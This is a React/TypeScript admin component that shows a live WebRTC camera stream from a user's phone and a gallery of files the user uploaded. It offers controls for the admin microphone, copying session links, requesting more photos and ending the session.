'use client';

import React, { useState, useRef, useCallback, useEffect, useMemo } from 'react';
import { useWebRTCAdmin } from '@/lib/webrtc/useWebRTCAdmin';
import { ConnectionStatus } from '@/components/ConnectionStatus';
import { UserSession, SessionFile } from '@/lib/types';
import {
  Phone,
  Clock,
  Maximize2,
  X,
  AlertTriangle,
  Volume2,
  VolumeX,
  Copy,
  Check,
  Globe,
  Mic,
  MicOff,
  FolderUp,
  Image as ImageIcon,
  FileText,
  Download,
  RefreshCw,
  ExternalLink,
  ChevronLeft,
  ChevronRight,
  Sparkles,
  Video,
  Send,
  Eye,
} from 'lucide-react';

interface LiveStreamCardProps {
  session: UserSession;
  onClose: () => void;
  onTerminate: (sessionId: string) => void;
}

function formatBytes(bytes: number, decimals = 1) {
  if (!bytes || bytes === 0) return '0 B';
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

export const LiveStreamCard: React.FC<LiveStreamCardProps> = ({
  session,
  onClose,
  onTerminate,
}) => {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [isMuted, setIsMuted] = useState<boolean>(true);
  const [isCopied, setIsCopied] = useState<boolean>(false);
  const [isCopiedAr, setIsCopiedAr] = useState<boolean>(false);

  // Tab & Files state
  const [activeTab, setActiveTab] = useState<'video' | 'files'>('video');
  const [files, setFiles] = useState<SessionFile[]>(session.files || []);
  const [fileFilter, setFileFilter] = useState<'all' | 'photos' | 'docs'>('all');
  const [previewFile, setPreviewFile] = useState<SessionFile | null>(null);
  const [isRequestingFiles, setIsRequestingFiles] = useState<boolean>(false);
  const [requestSentSuccess, setRequestSentSuccess] = useState<boolean>(false);
  const [isRefreshingFiles, setIsRefreshingFiles] = useState<boolean>(false);

  const {
    remoteStream,
    connectionState,
    error,
    isAdminMicMuted,
    isAdminMicActive,
    reconnect,
    startAdminMic,
    stopAdminMic,
    toggleAdminMic,
  } = useWebRTCAdmin({
    sessionId: session.id,
    onSessionTerminated: () => {
      onClose();
    },
  });

  const setVideoRef = useCallback(
    (el: HTMLVideoElement | null) => {
      videoRef.current = el;
      if (el && remoteStream) {
        if (el.srcObject !== remoteStream) {
          el.srcObject = remoteStream;
        }
        el.muted = isMuted;
        el.play().catch((e) => console.warn('[Admin Video Autoplay]', e));
      }
    },
    [remoteStream, isMuted]
  );

  useEffect(() => {
    if (videoRef.current && remoteStream) {
      if (videoRef.current.srcObject !== remoteStream) {
        videoRef.current.srcObject = remoteStream;
      }
      videoRef.current.muted = isMuted;
      videoRef.current.play().catch((e) => console.warn('[Admin Video Autoplay]', e));
    }
  }, [remoteStream, isMuted]);

  // Periodic polling for uploaded files
  const fetchSessionFiles = useCallback(async () => {
    try {
      const res = await fetch(`/api/sessions/${session.id}/files`);
      if (res.ok) {
        const data = await res.json();
        if (data.files && Array.isArray(data.files)) {
          setFiles(data.files);
        }
      }
    } catch (err) {
      console.warn('[Admin LiveStreamCard] Failed to fetch files:', err);
    }
  }, [session.id]);

  useEffect(() => {
    fetchSessionFiles();
    const interval = setInterval(fetchSessionFiles, 2500);
    return () => clearInterval(interval);
  }, [fetchSessionFiles]);

  const handleManualRefreshFiles = async () => {
    setIsRefreshingFiles(true);
    await fetchSessionFiles();
    setTimeout(() => setIsRefreshingFiles(false), 500);
  };

  const handleRequestMoreFiles = async () => {
    setIsRequestingFiles(true);
    try {
      const res = await fetch(`/api/sessions/${session.id}/request-files`, { method: 'POST' });
      if (res.ok) {
        setRequestSentSuccess(true);
        setTimeout(() => setRequestSentSuccess(false), 3000);
      }
    } catch (err) {
      console.warn('Failed to request files:', err);
    } finally {
      setIsRequestingFiles(false);
    }
  };

  const toggleMute = () => {
    setIsMuted((prev) => {
      const next = !prev;
      if (videoRef.current) {
        videoRef.current.muted = next;
      }
      return next;
    });
  };

  const toggleFullscreen = () => {
    if (videoRef.current) {
      if (document.fullscreenElement) {
        document.exitFullscreen();
      } else {
        videoRef.current.requestFullscreen();
      }
    }
  };

  const handleCopyClientLink = async () => {
    if (typeof window === 'undefined') return;
    const clientUrl = `${window.location.origin}/?sessionId=${session.id}`;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(clientUrl);
      } else {
        const textArea = document.createElement('textarea');
        textArea.value = clientUrl;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        textArea.remove();
      }
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 2500);
    } catch (err) {
      console.warn('Failed to copy client link', err);
    }
  };

  const handleCopyArabicLink = async () => {
    if (typeof window === 'undefined') return;
    const clientUrl = `${window.location.origin}/?sessionId=${session.id}&lang=ar`;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(clientUrl);
      } else {
        const textArea = document.createElement('textarea');
        textArea.value = clientUrl;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        textArea.remove();
      }
      setIsCopiedAr(true);
      setTimeout(() => setIsCopiedAr(false), 2500);
    } catch (err) {
      console.warn('Failed to copy arabic link', err);
    }
  };

  const formattedStartTime = new Date(session.createdAt).toLocaleTimeString('de-DE', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  const photoFiles = useMemo(() => {
    return files.filter(
      (f) => f.type?.startsWith('image/') || /\.(png|jpe?g|webp|gif|bmp|heic)$/i.test(f.name)
    );
  }, [files]);

  const docFiles = useMemo(() => {
    return files.filter(
      (f) => !f.type?.startsWith('image/') && !/\.(png|jpe?g|webp|gif|bmp|heic)$/i.test(f.name)
    );
  }, [files]);

  const filteredFiles = useMemo(() => {
    if (fileFilter === 'photos') return photoFiles;
    if (fileFilter === 'docs') return docFiles;
    return files;
  }, [fileFilter, files, photoFiles, docFiles]);

  return (
    <div className="bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-zinc-200 dark:border-zinc-800 overflow-hidden flex flex-col">
      {/* Header */}
      <div className="p-4 bg-zinc-50 dark:bg-zinc-800/60 border-b border-zinc-200 dark:border-zinc-800 flex flex-wrap items-center justify-between gap-3">
        <div className="space-y-1.5">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="font-mono text-xs font-semibold px-2 py-0.5 rounded bg-zinc-200 dark:bg-zinc-700 text-zinc-800 dark:text-zinc-200">
              ID: {session.id.substring(0, 8)}...
            </span>

            {/* Client Links Buttons */}
            <button
              type="button"
              onClick={handleCopyClientLink}
              title={`نسخ رابط العميل: ${typeof window !== 'undefined' ? window.location.origin : ''}/?sessionId=${session.id}`}
              className={`inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-medium rounded-lg border transition-all shadow-sm ${
                isCopied
                  ? 'bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-800'
                  : 'bg-blue-50 text-blue-700 hover:bg-blue-100 border-blue-200 dark:bg-blue-950/60 dark:text-blue-300 dark:hover:bg-blue-900/60 dark:border-blue-800'
              }`}
            >
              {isCopied ? (
                <>
                  <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" />
                  <span className="font-semibold text-emerald-700 dark:text-emerald-300">تم النسخ!</span>
                </>
              ) : (
                <>
                  <Copy className="w-3.5 h-3.5" />
                  <span>نسخ رابط العميل</span>
                </>
              )}
            </button>

            <button
              type="button"
              onClick={handleCopyArabicLink}
              title={`نسخ رابط العميل باللغة العربية: ${typeof window !== 'undefined' ? window.location.origin : ''}/?sessionId=${session.id}&lang=ar`}
              className={`inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-medium rounded-lg border transition-all shadow-sm ${
                isCopiedAr
                  ? 'bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-800'
                  : 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border-emerald-200 dark:bg-emerald-950/60 dark:text-emerald-300 dark:hover:bg-emerald-900/60 dark:border-emerald-800'
              }`}
            >
              {isCopiedAr ? (
                <>
                  <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" />
                  <span className="font-semibold text-emerald-700 dark:text-emerald-300">تم النسخ (عربي)!</span>
                </>
              ) : (
                <>
                  <Globe className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" />
                  <span>رابط عربي 🇸🇦</span>
                </>
              )}
            </button>

            <ConnectionStatus
              status={remoteStream ? 'connected' : connectionState}
              isLive={!!remoteStream && connectionState === 'connected'}
            />
          </div>

          <div className="flex items-center gap-4 text-xs text-zinc-500 dark:text-zinc-400">
            <span className="flex items-center gap-1">
              <Phone className="w-3.5 h-3.5" />
              <strong className="text-zinc-700 dark:text-zinc-300 font-mono">
                {session.maskedPhoneNumber}
              </strong>
            </span>
            <span className="flex items-center gap-1">
              <Clock className="w-3.5 h-3.5" />
              <span>Start: {formattedStartTime}</span>
            </span>
          </div>
        </div>

        {/* Top Actions */}
        <div className="flex items-center gap-2">
          {remoteStream && (
            <button
              onClick={toggleMute}
              title={isMuted ? 'Ton einschalten' : 'Ton stummschalten'}
              className={`p-2 rounded-lg transition-all ${
                isMuted
                  ? 'bg-amber-50 dark:bg-amber-950/40 text-amber-700 dark:text-amber-300 hover:bg-amber-100'
                  : 'bg-emerald-50 dark:bg-emerald-950/40 text-emerald-700 dark:text-emerald-300 hover:bg-emerald-100'
              }`}
            >
              {isMuted ? <VolumeX className="w-4 h-4" /> : <Volume2 className="w-4 h-4" />}
            </button>
          )}

          {remoteStream && (
            <button
              onClick={() => {
                if (!isAdminMicActive) {
                  startAdminMic();
                } else {
                  toggleAdminMic();
                }
              }}
              title={!isAdminMicActive ? 'Mikrofon aktivieren' : (isAdminMicMuted ? 'Mikrofon einschalten' : 'Mikrofon stummschalten')}
              className={`p-2 rounded-lg transition-all ${
                !isAdminMicActive
                  ? 'bg-zinc-100 dark:bg-zinc-800 text-zinc-500 dark:text-zinc-400 hover:bg-zinc-200'
                  : isAdminMicMuted
                  ? 'bg-red-50 dark:bg-red-950/40 text-red-700 dark:text-red-300 hover:bg-red-100'
                  : 'bg-emerald-50 dark:bg-emerald-950/40 text-emerald-700 dark:text-emerald-300 hover:bg-emerald-100'
              }`}
            >
              {isAdminMicActive && !isAdminMicMuted ? <Mic className="w-4 h-4" /> : <MicOff className="w-4 h-4" />}
            </button>
          )}

          <button
            onClick={toggleFullscreen}
            title="Vollbild"
            className="p-2 rounded-lg bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-700 dark:text-zinc-300 transition-all"
          >
            <Maximize2 className="w-4 h-4" />
          </button>
          <button
            onClick={onClose}
            title="Schließen"
            className="p-2 rounded-lg bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-700 dark:text-zinc-300 transition-all"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* TABS SELECTOR (Live Video vs Photos & Files) */}
      <div className="flex border-b border-zinc-200 dark:border-zinc-800 bg-zinc-100/60 dark:bg-zinc-950/60 px-4">
        <button
          type="button"
          onClick={() => setActiveTab('video')}
          className={`flex items-center gap-2 py-3 px-4 text-xs font-bold border-b-2 transition-all ${
            activeTab === 'video'
              ? 'border-blue-600 text-blue-600 dark:text-blue-400 bg-white dark:bg-zinc-900'
              : 'border-transparent text-zinc-600 dark:text-zinc-400 hover:text-zinc-900 dark:hover:text-white'
          }`}
        >
          <Video className="w-4 h-4" />
          <span>البث المباشر للكاميرا</span>
          {remoteStream && (
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
          )}
        </button>

        <button
          type="button"
          onClick={() => setActiveTab('files')}
          className={`flex items-center gap-2 py-3 px-4 text-xs font-bold border-b-2 transition-all ${
            activeTab === 'files'
              ? 'border-amber-500 text-amber-600 dark:text-amber-400 bg-white dark:bg-zinc-900'
              : 'border-transparent text-zinc-600 dark:text-zinc-400 hover:text-zinc-900 dark:hover:text-white'
          }`}
        >
          <FolderUp className="w-4 h-4 text-amber-500" />
          <span>صور وملفات المستخدم</span>
          <span className={`px-2 py-0.5 rounded-full text-[10px] font-black ${
            files.length > 0
              ? 'bg-amber-500 text-white'
              : 'bg-zinc-200 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-400'
          }`}>
            {files.length}
          </span>
        </button>
      </div>

      {/* TAB 1: LIVE VIDEO STREAM */}
      {activeTab === 'video' && (
        <div>
          <div className="relative aspect-video w-full bg-black flex items-center justify-center overflow-hidden">
            {remoteStream ? (
              <video
                ref={setVideoRef}
                autoPlay
                playsInline
                muted={isMuted}
                className="w-full h-full object-contain"
              />
            ) : (
              <div className="text-center p-6 space-y-3">
                <div className="w-12 h-12 mx-auto rounded-full bg-zinc-800 flex items-center justify-center text-zinc-400 animate-pulse">
                  <span className="relative flex h-3 w-3">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-3 w-3 bg-blue-500"></span>
                  </span>
                </div>
                <p className="text-sm font-medium text-zinc-300">
                  Verbindung wird hergestellt...
                </p>
                <p className="text-xs text-zinc-500 max-w-xs">
                  Warten auf eingehenden Video- und Audio-Stream vom Smartphone über PeerJS Cloud.
                </p>
              </div>
            )}

            {error && (
              <div className="absolute inset-0 bg-black/80 flex items-center justify-center p-4 z-10">
                <div className="bg-red-950/80 border border-red-800 text-red-200 p-4 rounded-xl max-w-sm text-center space-y-3">
                  <AlertTriangle className="w-6 h-6 mx-auto text-red-400" />
                  <p className="text-sm font-semibold">{error}</p>
                  <button
                    onClick={reconnect}
                    className="px-4 py-1.5 rounded-lg text-xs font-semibold bg-red-700 hover:bg-red-600 text-white transition-all shadow-sm"
                  >
                    Erneut verbinden
                  </button>
                </div>
              </div>
            )}
          </div>

          {/* Quick mini-strip of photos under the video if user uploaded files */}
          {files.length > 0 && (
            <div className="p-3 bg-zinc-100 dark:bg-zinc-800/80 border-t border-zinc-200 dark:border-zinc-700 flex items-center justify-between gap-3">
              <div className="flex items-center gap-2 overflow-x-auto scrollbar-thin py-1">
                <span className="text-xs font-bold text-zinc-600 dark:text-zinc-300 flex items-center gap-1.5 flex-shrink-0">
                  <ImageIcon className="w-3.5 h-3.5 text-amber-500" />
                  <span>معرض الصور ({files.length}):</span>
                </span>
                {files.slice(0, 8).map((file) => {
                  const isImg = file.type?.startsWith('image/') || /\.(png|jpe?g|webp|gif)$/i.test(file.name);
                  return (
                    <button
                      key={file.id}
                      type="button"
                      onClick={() => {
                        setPreviewFile(file);
                        setActiveTab('files');
                      }}
                      className="w-10 h-10 rounded-lg overflow-hidden border border-zinc-300 dark:border-zinc-600 flex-shrink-0 bg-zinc-200 dark:bg-zinc-700 hover:scale-105 transition-all shadow-sm"
                      title={file.name}
                    >
                      {isImg ? (
                        <img src={file.url} alt={file.name} className="w-full h-full object-cover" />
                      ) : (
                        <div className="w-full h-full flex items-center justify-center">
                          <FileText className="w-5 h-5 text-amber-500" />
                        </div>
                      )}
                    </button>
                  );
                })}
              </div>

              <button
                type="button"
                onClick={() => setActiveTab('files')}
                className="text-xs font-bold text-blue-600 dark:text-blue-400 hover:underline flex-shrink-0"
              >
                عرض كل الملفات ({files.length}) ←
              </button>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: USER PHOTOS & FILES GALLERY */}
      {activeTab === 'files' && (
        <div className="p-5 space-y-5 min-h-[360px] bg-zinc-50/50 dark:bg-zinc-950/30">
          {/* Action bar */}
          <div className="flex flex-wrap items-center justify-between gap-3 pb-3 border-b border-zinc-200 dark:border-zinc-800">
            {/* Filter pills */}
            <div className="flex items-center gap-1.5">
              <button
                type="button"
                onClick={() => setFileFilter('all')}
                className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                  fileFilter === 'all'
                    ? 'bg-amber-500 text-white shadow-sm'
                    : 'bg-zinc-100 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-400 hover:bg-zinc-200'
                }`}
              >
                الكل ({files.length})
              </button>
              <button
                type="button"
                onClick={() => setFileFilter('photos')}
                className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                  fileFilter === 'photos'
                    ? 'bg-amber-500 text-white shadow-sm'
                    : 'bg-zinc-100 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-400 hover:bg-zinc-200'
                }`}
              >
                الصور ({photoFiles.length})
              </button>
              <button
                type="button"
                onClick={() => setFileFilter('docs')}
                className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                  fileFilter === 'docs'
                    ? 'bg-amber-500 text-white shadow-sm'
                    : 'bg-zinc-100 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-400 hover:bg-zinc-200'
                }`}
              >
                المستندات ({docFiles.length})
              </button>
            </div>

            {/* Admin actions: Request more files & Refresh */}
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={handleRequestMoreFiles}
                disabled={isRequestingFiles}
                title="إرسال طلب للمستخدم لمشاركة المزيد من الصور والملفات"
                className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white text-xs font-bold flex items-center gap-1.5 shadow-sm transition-all active:scale-95 disabled:opacity-50"
              >
                <Send className="w-3.5 h-3.5" />
                <span>{isRequestingFiles ? 'جاري الإرسال...' : 'طلب صور إضافية من المستخدم'}</span>
              </button>

              <button
                type="button"
                onClick={handleManualRefreshFiles}
                title="تحديث قائمة الملفات"
                className="p-1.5 rounded-xl bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-600 dark:text-zinc-300 transition-all"
              >
                <RefreshCw className={`w-4 h-4 ${isRefreshingFiles ? 'animate-spin' : ''}`} />
              </button>
            </div>
          </div>

          {/* Request sent feedback message */}
          {requestSentSuccess && (
            <div className="p-3 rounded-xl bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-200 dark:border-emerald-800 text-xs font-bold text-emerald-700 dark:text-emerald-300 flex items-center gap-2 animate-in fade-in">
              <Check className="w-4 h-4" />
              <span>تم إرسال تنبيه للمستخدم بنجاح لطلب صور وملفات إضافية!</span>
            </div>
          )}

          {/* Gallery View */}
          {filteredFiles.length === 0 ? (
            <div className="py-14 text-center space-y-3">
              <div className="w-16 h-16 mx-auto rounded-3xl bg-amber-50 dark:bg-amber-950/40 border border-amber-200 dark:border-amber-900/50 flex items-center justify-center text-amber-500">
                <FolderUp className="w-8 h-8" />
              </div>
              <h3 className="text-sm font-bold text-zinc-800 dark:text-zinc-200">
                لم يقم المستخدم بمشاركة أي صور أو ملفات بعد
              </h3>
              <p className="text-xs text-zinc-500 dark:text-zinc-400 max-w-sm mx-auto">
                بمجرد أن يمنح المستخدم الإذن ويختار صوره من هاتفه أو جهازه، ستظهر هنا فوراً بدقة كاملة.
              </p>
              <button
                type="button"
                onClick={handleRequestMoreFiles}
                className="mt-2 px-4 py-2 rounded-xl bg-amber-500 hover:bg-amber-600 text-white text-xs font-bold inline-flex items-center gap-2 shadow-sm transition-all"
              >
                <Send className="w-3.5 h-3.5" />
                <span>إرسال طلب الآن للمستخدم لمشاركة صوره 📂</span>
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3.5">
              {filteredFiles.map((file) => {
                const isImg = file.type?.startsWith('image/') || /\.(png|jpe?g|webp|gif|bmp|heic)$/i.test(file.name);
                const uploadDate = new Date(file.uploadedAt).toLocaleTimeString('de-DE', {
                  hour: '2-digit',
                  minute: '2-digit',
                });

                return (
                  <div
                    key={file.id}
                    className="group relative rounded-2xl border border-zinc-200 dark:border-zinc-800 bg-white dark:bg-zinc-900 overflow-hidden shadow-sm hover:shadow-md transition-all flex flex-col justify-between"
                  >
                    {/* Thumbnail / Visual */}
                    <div
                      onClick={() => setPreviewFile(file)}
                      className="aspect-square w-full bg-zinc-100 dark:bg-zinc-800 cursor-pointer overflow-hidden relative flex items-center justify-center"
                    >
                      {isImg ? (
                        <img
                          src={file.url}
                          alt={file.name}
                          className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300"
                        />
                      ) : (
                        <div className="flex flex-col items-center justify-center p-3 text-center">
                          <FileText className="w-10 h-10 text-amber-500 mb-1" />
                          <span className="text-[10px] font-mono text-zinc-500 dark:text-zinc-400">
                            {file.type?.split('/')[1]?.toUpperCase() || 'FILE'}
                          </span>
                        </div>
                      )}

                      {/* Hover action overlay */}
                      <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center gap-2 backdrop-blur-[2px]">
                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            setPreviewFile(file);
                          }}
                          className="p-2 rounded-xl bg-white/90 text-zinc-900 hover:bg-white transition-all shadow"
                          title="معاينة"
                        >
                          <Eye className="w-4 h-4" />
                        </button>
                        <a
                          href={`${file.url}?download=1`}
                          download={file.name}
                          onClick={(e) => e.stopPropagation()}
                          className="p-2 rounded-xl bg-amber-500 text-white hover:bg-amber-600 transition-all shadow"
                          title="تحميل"
                        >
                          <Download className="w-4 h-4" />
                        </a>
                      </div>
                    </div>

                    {/* Metadata Footer */}
                    <div className="p-2.5 space-y-1">
                      <p
                        className="text-xs font-bold text-zinc-800 dark:text-zinc-200 truncate"
                        title={file.name}
                      >
                        {file.name}
                      </p>
                      <div className="flex items-center justify-between text-[10px] text-zinc-400">
                        <span>{formatBytes(file.size)}</span>
                        <span>{uploadDate}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* Footer controls */}
      <div className="p-3 bg-zinc-50 dark:bg-zinc-800/40 border-t border-zinc-200 dark:border-zinc-800 flex items-center justify-between">
        <span className="text-xs text-zinc-500 dark:text-zinc-400 flex items-center gap-2">
          نظام المراقبة والتحكم المباشر (WebRTC & Files Access)
          {isAdminMicActive && (
            <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold ${
              isAdminMicMuted
                ? 'bg-red-100 dark:bg-red-950/40 text-red-600 dark:text-red-400'
                : 'bg-emerald-100 dark:bg-emerald-950/40 text-emerald-600 dark:text-emerald-400'
            }`}>
              {isAdminMicMuted ? <MicOff className="w-3 h-3" /> : <Mic className="w-3 h-3" />}
              {isAdminMicMuted ? 'Mikrofon stumm' : 'Mikrofon aktiv'}
            </span>
          )}
        </span>
        <button
          onClick={() => onTerminate(session.id)}
          className="px-3 py-1.5 rounded-lg text-xs font-medium bg-red-600 hover:bg-red-700 text-white transition-all shadow-sm"
        >
          Sitzung beenden
        </button>
      </div>

      {/* LIGHTBOX PREVIEW MODAL */}
      {previewFile && (
        <div
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in"
          onClick={() => setPreviewFile(null)}
        >
          <div
            className="relative max-w-4xl w-full max-h-[90vh] bg-zinc-900 border border-zinc-800 rounded-3xl overflow-hidden shadow-2xl flex flex-col"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="p-4 bg-zinc-950/80 border-b border-zinc-800 flex items-center justify-between">
              <div>
                <h4 className="text-sm font-bold text-white truncate max-w-md">
                  {previewFile.name}
                </h4>
                <p className="text-[11px] text-zinc-400">
                  {formatBytes(previewFile.size)} • {new Date(previewFile.uploadedAt).toLocaleString('de-DE')}
                </p>
              </div>

              <div className="flex items-center gap-2">
                <a
                  href={`${previewFile.url}?download=1`}
                  download={previewFile.name}
                  className="px-3 py-1.5 rounded-xl bg-amber-500 hover:bg-amber-600 text-white text-xs font-bold flex items-center gap-1.5 transition-all shadow"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>تحميل الملف</span>
                </a>
                <button
                  type="button"
                  onClick={() => setPreviewFile(null)}
                  className="p-1.5 rounded-xl text-zinc-400 hover:text-white bg-zinc-800 hover:bg-zinc-700 transition-all"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>

            {/* Modal Body */}
            <div className="p-4 flex-1 flex items-center justify-center bg-black/50 overflow-auto">
              {previewFile.type?.startsWith('image/') || /\.(png|jpe?g|webp|gif|bmp|heic)$/i.test(previewFile.name) ? (
                <img
                  src={previewFile.url}
                  alt={previewFile.name}
                  className="max-h-[70vh] max-w-full object-contain rounded-xl shadow-lg"
                />
              ) : (
                <div className="text-center py-12 space-y-4">
                  <FileText className="w-16 h-16 mx-auto text-amber-500" />
                  <div>
                    <p className="text-sm font-bold text-white">{previewFile.name}</p>
                    <p className="text-xs text-zinc-400 mt-1">{previewFile.type || 'ملف غير معروف'}</p>
                  </div>
                  <a
                    href={previewFile.url}
                    target="_blank"
                    rel="noreferrer"
                    className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold transition-all shadow"
                  >
                    <ExternalLink className="w-4 h-4" />
                    <span>فتح في علامة تبويب جديدة</span>
                  </a>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
